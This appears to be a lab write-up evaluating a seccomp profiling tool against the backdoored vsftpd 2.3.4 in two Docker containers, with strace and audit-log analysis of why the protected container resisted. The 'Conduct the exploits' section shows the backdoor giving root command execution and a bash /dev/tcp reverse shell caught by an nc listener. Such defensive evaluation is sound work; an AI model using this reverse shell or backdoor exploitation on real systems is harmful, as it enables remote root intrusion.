## vsftpd – chestnut

### Preparation

_For the container with seccomp, we execute the file `/tmp/script.sh` which is extracting the system calls from the binary `vsftpd`, creating a seccomp-profile based on these detected system calls and subsequently applying the profile on the binary. Afterwards, the binary is automatically run._

`docker exec -it vsftpd-chestnut-seccomp-container bash -c "source /Chestnut/Binalyzer/venv/bin/activate && /tmp/script.sh"  `

_For the container without seccomp, we just have to start it with following command:_

`docker exec -it vsftpd-chestnut-normal-container /app/vsftpd-2.3.4-infected/vsftpd /app/vsftpd-2.3.4-infected/vsftpd.conf`

### Conduct the exploits

First, we verify the IP addresses of the container, to ensure we target the right containers:

```
❯ docker ps
CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
4f16987c58e0 vsftpd-chestnut-seccomp "/bin/bash" 10 minutes ago Up 10 minutes 0.0.0.0:2104->21/tcp, [::]:2104->21/tcp, 0.0.0.0:6204->6200/tcp, [::]:6204->6200/tcp vsftpd-chestnut-seccomp-container
66fa1ece7f08 vsftpd-chestnut-normal "/bin/bash" 10 minutes ago Up 10 minutes 0.0.0.0:2103->21/tcp, [::]:2103->21/tcp, 0.0.0.0:6203->6200/tcp, [::]:6203->6200/tcp vsftpd-chestnut-normal-container

❯ docker inspect vsftpd-chestnut-seccomp-container | grep '"IPAddress":'
"IPAddress": "192.168.224.2",
❯ docker inspect vsftpd-chestnut-normal-container | grep '"IPAddress":'
"IPAddress": "192.168.224.3",

```

_Seccomp_:
The attack on the container with the applied seccomp profile on the binary fails:

```
❯ ./attackSubject.sh 192.168.224.2 whoami
read(net): Connection reset by peer
[-] no response!
❯ ./attackSubject.sh 192.168.224.2 id
read(net): Connection reset by peer
[-] no response!
❯ ./attackSubject.sh 192.168.224.2 ls
read(net): Connection reset by peer
[-] no response!
❯ ./attackSubject.sh 192.168.224.2 pwd
read(net): Connection reset by peer
[-] no response!
```

_Normal_
The attack on the container without the seccomp profile succeeds. We are able to run arbitrary commands:

```
❯ ./attackSubject.sh 192.168.224.3 "id"
[+] worked: uid=0(root) gid=0(root) groups=0(root)
❯ ./attackSubject.sh 192.168.224.3 "pwd"
[+] worked: /app/vsftpd-2.3.4-infected
❯ ./attackSubject.sh 192.168.224.3 "ls"
[+] worked: AUDIT
BENCHMARKS
❯ ./attackSubject.sh 192.168.224.3 "whoami"
[+] worked: root
❯ ./attackSubject.sh 192.168.224.3 "bash -c 'bash -i >& /dev/tcp/192.168.224.1/4444 0>&1'"
[-] no response!

❯ nc -lvnp 4444 # note, this is on another terminal
Connection from 192.168.224.3:37400
bash: cannot set terminal process group (33): Inappropriate ioctl for device
bash: no job control in this shell
root@66fa1ece7f08:/app/vsftpd-2.3.4-infected# id
id
uid=0(root) gid=0(root) groups=0(root)

```

### Analysis

As the exploit worked on the container without the seccomp profile, only the one with the enforced profile will be analysed.

_strace output:_
When starting the container with the command `strace -f /tool/Chestnut/ChestnutPatcher/rewrite.sh /app/vsftpd-2.3.4-infected/vsftpd /app/vsftpd-2.3.4-infected/vsftpd.conf` we are able to see that just before the process with the pid `88` was killed with the signal `SIGSYS`, the system call `wait4` was executed.
In addition, pid `89` executed `getgid` and was also with `SIGSYS`.

```
[pid    88] alarm(0 <unfinished ...>
[pid    88] <... alarm resumed> )       = 1
[pid    88] wait4(-1,  <unfinished ...>
[pid    88] <... wait4 resumed> NULL, WNOHANG, NULL) = 61
[pid    88] +++ killed by SIGSYS +++
...
[pid    89] mprotect(0x5b5ee881b000, 8192, PROT_READ) = 0
[pid    89] mprotect(0x7d22d1047000, 4096, PROT_READ) = 0
[pid    89] munmap(0x7d22d103c000, 17328) = 0
[pid    89] getuid()                    = 0
[pid    89] getgid()                    = 104
[pid    89] +++ killed by SIGSYS (core dumped) +++
```

Further analysis on the host machine with the tool `ausearch` delievers us more insights.
As we can see, the syscalls with the number `104` and `61` were the reason for the `SIGSYS` signal.

```
----
# whoami command
time->Thu May  1 09:04:26 2025
type=SECCOMP msg=audit(1746083066.494:1450): auid=4294967295 uid=0 gid=0 ses=4294967295 pid=22798 comm="sh" exe="/bin/dash" sig=31 arch=c000003e syscall=104 compat=0 ip=0x7d22d0b12857 code=0x0
----
time->Thu May  1 09:04:26 2025
type=SECCOMP msg=audit(1746083066.590:1456): auid=4294967295 uid=0 gid=0 ses=4294967295 pid=22711 comm="vsftpd_patched" exe="/app/vsftpd-2.3.4-infected/vsftpd_patched" sig=31 arch=c000003e syscall=61 compat=0 ip=0x7acc6eeb6337 code=0x0
```

We verify that the system call numbers `104` and `61` map to `getgid` and `wait4` with the `ausyscall` tool:

```
❯ ausyscall --dump | grep 104
104	getgid

❯ ausyscall --dump | grep 61
61	wait4
```

The last thing we check is, if the system call numbers `104` and `61` was in the applied seccomp profile. The file `policy__app_vsftpd-2.3.4-infected_vsftpd.json` shows no presence:

```json
{
  "version": 1,
  "syscalls": [
    0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 20, 21, 23, 28,
    33, 37, 38, 39, 41, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56,
    59, 60, 62, 63, 72, 77, 78, 79, 80, 82, 83, 84, 87, 89, 90, 91, 93, 95, 96,
    102, 105, 106, 107, 108, 111, 112, 113, 114, 116, 132, 157, 158, 161, 164,
    186, 201, 202, 229, 231, 234, 257, 262, 302
  ]
}
```

## Appendix

The following shows the time needed to extract the system calls from 3 runs:

```
docker exec -it vsftpd-chestnut-seccomp-container bash -c "rm /Chestnut/Binalyzer/cached_results/*; source /Chestnut/Binalyzer/venv/bin/activate && cd /Chestnut/Binalyzer && time python3 /Chestnut/Binalyzer/filter.py /app/vsftpd-2.3.4-infected/vsftpd"
...
real	0m26.930s
user	0m25.725s
sys	0m1.084s

docker exec -it vsftpd-chestnut-seccomp-container bash -c "rm /Chestnut/Binalyzer/cached_results/*; source /Chestnut/Binalyzer/venv/bin/activate && cd /Chestnut/Binalyzer && time python3 /Chestnut/Binalyzer/filter.py /app/vsftpd-2.3.4-infected/vsftpd"
...
real	0m28.045s
user	0m26.789s
sys	0m1.109s

docker exec -it vsftpd-chestnut-seccomp-container bash -c "rm /Chestnut/Binalyzer/cached_results/*; source /Chestnut/Binalyzer/venv/bin/activate && cd /Chestnut/Binalyzer && time python3 /Chestnut/Binalyzer/filter.py /app/vsftpd-2.3.4-infected/vsftpd"
...
real	0m27.484s
user	0m26.194s
sys	0m1.140s
```
